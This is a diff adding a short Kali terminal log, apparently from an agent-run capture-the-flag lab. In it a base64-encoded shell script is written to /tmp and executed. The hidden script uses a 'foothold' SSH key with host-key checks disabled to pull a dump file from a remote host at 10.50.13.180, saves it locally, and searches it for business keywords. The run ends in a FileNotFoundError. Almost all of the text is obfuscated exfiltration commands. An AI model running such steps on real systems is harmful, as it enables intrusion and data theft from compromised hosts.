@@ -1,0 +1,12 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/w01af.sh <<'B64EOF'
+> IyEvYmluL2Jhc2gKUz0ic3NoIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBCYXRjaE1vZGU9eWVzIC1pIH4vLnNzaC9rZXBsZXJvcHMtZm9vdGhvbGQgLXAgMjIyMiByb3dhbkAxMC41MC4xMy4xODAiCiRTICdiYXNlNjQgLXcwIC90bXAvY2guZHVtcCcgPiAvdG1wL2NoLmI2NCAyPi9kZXYvbnVsbApweXRob24zIC0gPDwnUFknCmltcG9ydCBiYXNlNjQscmUKYj1iYXNlNjQuYjY0ZGVjb2RlKG9wZW4oJy90bXAvY2guYjY0JykucmVhZCgpKQpvcGVuKCcvaG9tZS9rYWxpL2N0Zi9sYW5lcy93MDEvY29tcGFueS1oaXN0b3J5LmR1bXAnLCd3YicpLndyaXRlKGIpCnByaW50KCdsZW4nLGxlbihiKSkKdD1iLmRlY29kZSgndXRmLTgnLCdyZXBsYWNlJykKZm9yIGt3IGluIFsnQ2Fpcm4nLCdjYWlybicsJ2Nhc2VfcmVmJywncGxhbm5pbmcnLCdoYW5kb3ZlcicsJ3N1cHBsZW1lbnQnLCdwdXJjaGFzZScsJ2RyeSddOgogICAgcHJpbnQoJz09JyxrdywgW20uc3RhcnQoKSBmb3IgbSBpbiByZS5maW5kaXRlcihrdyx0KV1bOjEwXSkKcHJpbnQoJy0tLS0gcHJpbnRhYmxlIHRhaWwgLS0tLScpCnByaW50KHRbOjYwMDBdKQpQWQo=
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/w01af.sh; bash /tmp/w01af.sh; echo DONEMARK_1795201885510$((6*7))
+Traceback (most recent call last):
+  File "<stdin>", line 3, in <module>
+FileNotFoundError: [Errno 2] No such file or directory: '/home/kali/ctf/lanes/w01/company-history.dump'
